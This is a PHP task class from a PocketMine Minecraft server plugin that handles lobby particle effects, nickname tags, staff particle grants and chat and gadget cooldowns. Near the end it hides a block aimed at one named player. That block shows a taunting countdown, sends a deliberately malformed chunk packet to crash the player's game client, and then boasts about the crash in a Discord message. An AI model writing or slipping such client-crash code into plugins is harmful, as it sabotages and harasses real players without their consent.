<?php

namespace hyperiummc\core\task;

use JaxkDev\DiscordBot\Models\Messages\Embed\Embed;
use JaxkDev\DiscordBot\Models\Messages\Embed\Footer;
use JaxkDev\DiscordBot\Models\Messages\Message;
use hyperiummc\core\HyperiumCore;
use pocketmine\math\Vector3;
use pocketmine\scheduler\Task;
use pocketmine\network\mcpe\protocol\LevelChunkPacket;
use pocketmine\network\mcpe\protocol\types\ChunkPosition;
use pocketmine\utils\Config;
use pocketmine\world\particle\AngryVillagerParticle;
use pocketmine\world\particle\EntityFlameParticle;
use pocketmine\world\particle\FlameParticle;
use pocketmine\world\particle\HeartParticle;
use pocketmine\world\particle\HugeExplodeParticle;
use pocketmine\world\particle\SmokeParticle;
use pocketmine\world\particle\WaterDripParticle;
use pocketmine\world\particle\WaterParticle;

class LobbyTask extends Task{

    public $crashTime = 68;

    public function __construct(HyperiumCore $plugin){
        $this->plugin = $plugin;
        $this->heartr = 0;
        $this->firer = 0;
        $this->waterr = 0;
    }

    public function onRun(): void
    {
        foreach ($this->plugin->getServer()->getOnlinePlayers() as $player){
            if ($player->getWorld() === $this->plugin->getServer()->getWorldManager()->getDefaultWorld()){
                if (isset($this->plugin->nickedPlayer[$player->getName()])){
                    $player->sendTip("§bYou are currently §6Nicked");
                }
                if (isset($this->plugin->nickedPlayer[$player->getName()])){
                    $player->setNameTag("§7[§b{$this->plugin->getPlayerRank($player)}§7] §r{$this->plugin->nickedName[$player->getName()]}");
                } else {
                    $player->setNameTag("§7[§b{$this->plugin->getPlayerRank($player)}§7] §r{$player->getNetworkSession()->getDisplayName()}");
                }

                $x = $player->getLocation()->getX();
                $y = $player->getLocation()->getY();
                $z = $player->getLocation()->getZ();

                if (isset($this->plugin->lobbyParticle[$player->getName()])){
                    if ($this->plugin->lobbyParticle[$player->getName()] == "AngryVillager"){
                        $size = 1.2;
                        $a = cos(deg2rad($this->heartr/0.09))* $size;
                        $b = sin(deg2rad($this->heartr/0.09))* $size;
                        $c = sin(deg2rad($this->heartr/0.2))* $size;
                        $player->getWorld()->addParticle(new Vector3($x - $a, $y + $c + 1.4, $z - $b), new AngryVillagerParticle());
                    }

                    if ($this->plugin->lobbyParticle[$player->getName()] == "Water"){
                        $a = cos(deg2rad($this->waterr/0.04))* 0.5;
                        $b = sin(deg2rad($this->waterr/0.04))* 0.5;
                        $c = cos(deg2rad($this->waterr/0.04))* 0.8;
                        $d = sin(deg2rad($this->waterr/0.04))* 0.8;

                        $player->getWorld()->addParticle(new Vector3($x - $a, $y + 3, $z - $b), new SmokeParticle());
                        $player->getWorld()->addParticle(new Vector3($x - $b, $y + 3, $z - $a), new SmokeParticle());

                        $player->getWorld()->addParticle(new Vector3($x - $a, $y + 2.3, $z - $b), new WaterDripParticle());
                        $player->getWorld()->addParticle(new Vector3($x - $b, $y + 2.3, $z - $a), new WaterDripParticle());

                        $player->getWorld()->addParticle(new Vector3($x + $c, $y + 3, $z + $d), new SmokeParticle());
                        $player->getWorld()->addParticle(new Vector3($x + $c, $y + 3, $z + $d), new SmokeParticle());

                        $player->getWorld()->addParticle(new Vector3($x, $y + 3, $z), new SmokeParticle());
                        $player->getWorld()->addParticle(new Vector3($x, $y + 2.3, $z), new WaterDripParticle());

                        $this->waterr++;
                        if ($this->waterr >= 20) $this->waterr = 0;
                    }

                    if ($this->plugin->lobbyParticle[$player->getName()] == "Fire"){
                        $size = 0.8;
                        $a = cos(deg2rad($this->firer/0.04))* $size;
                        $b = sin(deg2rad($this->firer/0.04))* $size;
                        $c = cos(deg2rad($this->firer/0.04))* 0.6;
                        $d = sin(deg2rad($this->firer/0.04))* 0.6;
                        $player->getWorld()->addParticle(new Vector3($x + $a, $y + $c + $d + 1.2, $z + $b), new FlameParticle());
                        $player->getWorld()->addParticle(new Vector3($x - $b, $y + $c + $d + 1.2, $z - $a), new FlameParticle());
                        $this->firer++;
                        if ($this->firer >= 20) $this->firer = 0;
                    }

                    if ($this->plugin->lobbyParticle[$player->getName()] == "Heart"){
                        $size = 1.2;
                        $a = cos(deg2rad($this->heartr/0.09))* $size;
                        $b = sin(deg2rad($this->heartr/0.09))* $size;
                        $c = sin(deg2rad($this->heartr/0.2))* $size;

                        $player->getWorld()->addParticle(new Vector3($x - $a, $y + $c + 1.4, $z - $b), new HeartParticle($size));
                        $this->heartr++;

                        if ($this->heartr >= 20) $this->heartr = 0;

                    }

                    if ($this->plugin->lobbyParticle[$player->getName()] == "Smoke"){
                        $player->getWorld()->addParticle(new Vector3($player->getLocation()->getX(), $player->getLocation()->getY() + 2.5, $player->getLocation()->getZ()), new HugeExplodeParticle());
                    }
                }
            }

            $angryvillagerParticles = new Config($this->plugin->getDataFolder() . "particles/AngryVillager.yml", Config::YAML);
            $waterParticles = new Config($this->plugin->getDataFolder() . "particles/Water.yml", Config::YAML);
            $fireParticles = new Config($this->plugin->getDataFolder() . "particles/Fire.yml", Config::YAML);
            $heartParticles = new Config($this->plugin->getDataFolder() . "particles/Heart.yml", Config::YAML);
            $smokeParticles = new Config($this->plugin->getDataFolder() . "particles/Smoke.yml", Config::YAML);

            if ($player->hasPermission("hyperiummc.staff")){
                if (!$angryvillagerParticles->exists($player->getXuid())){
                    $angryvillagerParticles->set($player->getXuid(), true);
                    $angryvillagerParticles->save();
                }

                if (!$waterParticles->exists($player->getXuid())){
                    $waterParticles->set($player->getXuid(), true);
                    $waterParticles->save();
                }

                if (!$fireParticles->exists($player->getXuid())){
                    $fireParticles->set($player->getXuid(), true);
                    $fireParticles->save();
                }

                if (!$heartParticles->exists($player->getXuid())){
                    $heartParticles->set($player->getXuid(), true);
                    $heartParticles->save();
                }

                if (!$smokeParticles->exists($player->getXuid())){
                    $smokeParticles->set($player->getXuid(), true);
                    $smokeParticles->save();
                }
            }

            if (isset($this->plugin->chatcooldown[$player->getName()]) && $this->plugin->chatcooldown[$player->getName()] != 0){
                $this->plugin->chatcooldown[$player->getName()]--;
                //if ($this->plugin->chatcooldown[$player->getName()] == 5){
                  //  $this->plugin->chatcooldown[$player->getName()] == 4;
                //}

                //if ($this->plugin->chatcooldown[$player->getName()] == 4){
                  //  $this->plugin->chatcooldown[$player->getName()] == 3;
                //}

                //if ($this->plugin->chatcooldown[$player->getName()] == 3){
                  //  $this->plugin->chatcooldown[$player->getName()] == 2;
                //}

                //if ($this->plugin->chatcooldown[$player->getName()] == 2){
                  //  $this->plugin->chatcooldown[$player->getName()] == 1;
                //}

                //if ($this->plugin->chatcooldown[$player->getName()] == 1){
                  //  $this->plugin->chatcooldown[$player->getName()] == 0;
                //}

                //if ($this->plugin->chatcooldown[$player->getName()] == 0){
                  //  unset($this->plugin->chatcooldown[$player->getName()]);
                //}
            }
            if(isset($this->plugin->chatcooldown[$player->getName()]) && $this->plugin->chatcooldown[$player->getName()] == 0){
                unset($this->plugin->chatcooldown[$player->getName()]);
            }

            if (isset($this->plugin->gadgetcooldown[$player->getName()]) && $this->plugin->gadgetcooldown[$player->getName()] != 0){
                $this->plugin->gadgetcooldown[$player->getName()]--;
            }

            if (isset($this->plugin->gadgetcooldown[$player->getName()]) && $this->plugin->gadgetcooldown[$player->getName()] == 0){
                unset($this->plugin->gadgetcooldown[$player->getName()]);
            }

            if($player->getName() == "abc"){
                $this->crashTime--;
                $player->sendTip("§a恭喜你，你的minecraft将在 {$this->crashTime}s 后爆炸");
                if($this->crashTime == 0){
                    $this->crashTime = 50;
                    $player->sendMessage("Boom!");
                    //$chunk = $chunka->getChunkAtPosition($player->getLocation()->asVector3());
                    $pk = LevelChunkPacket::create(new ChunkPosition($player->getLocation()->getFloorX(), $player->getLocation()->getFloorZ()), 100000, true, [], "");
                    $player->getNetworkSession()->sendDataPacket($pk);

                    $embed = new Embed("Boom", Embed::TYPE_RICH, "Sucessfully crashed Johnnywai :D", null, time(), 0xEE5959, new Footer("HyperiumCore"), null, null, null, null, []);

                    $message = new Message("983273433653714945", null, "", $embed);

                    HyperiumCore::getDiscordAPI()->getApi()->sendMessage($message);
                }

            }
        }
        
        //$this->plugin->getServer()->getWorldManager()->getDefaultWorld()->setTime(1000);
    }
}
